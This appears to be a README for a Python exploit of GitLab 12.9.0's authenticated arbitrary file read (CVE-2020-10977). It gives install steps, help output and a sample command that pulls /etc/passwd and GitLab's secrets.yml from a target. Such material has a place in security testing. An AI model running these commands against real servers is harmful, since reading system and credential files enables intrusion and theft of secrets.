## The warn

For demonstration purpose and ethical hacking only.

## The what

A (wanted to be) better script than what can be found on exploit-db about the authenticated arbitrary read file on GitLab v12.9.0 (CVE-2020-10977) 

## The how

1. Meet the dependency (you probably already have the rest)

`pip3 install requests python-gitlab`

2. Get an API token using your credentials

[https://docs.gitlab.com/ee/user/profile/personal_access_tokens.html](https://docs.gitlab.com/ee/user/profile/personal_access_tokens.html)

3. Profit?

```
$ python3 gitlab-12.9.0-lfi.py -h
usage: gitlab-12.9.0-lfi.py [-h] -H HOST -u USER -p PASSWD -t TOKEN -f FILES

optional arguments:
  -h, --help            show this help message and exit
  -H HOST, --host HOST  The https URI to gitlab webroot
  -u USER, --user USER  The user name
  -p PASSWD, --passwd PASSWD
                        The user password
  -t TOKEN, --token TOKEN
                        The access token
  -f FILES, --files FILES
                        The absolute paths to the files on the Gitlab local system
```

```
$ python3 gitlab-12.9.0-file-read.py -H https://gitlab.domain.com/ -u erk3 -p test1234 -t 9nsDFXshb1txxkkZAv24 -f /etc/passwd -f /etc/hosts -f /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml
```

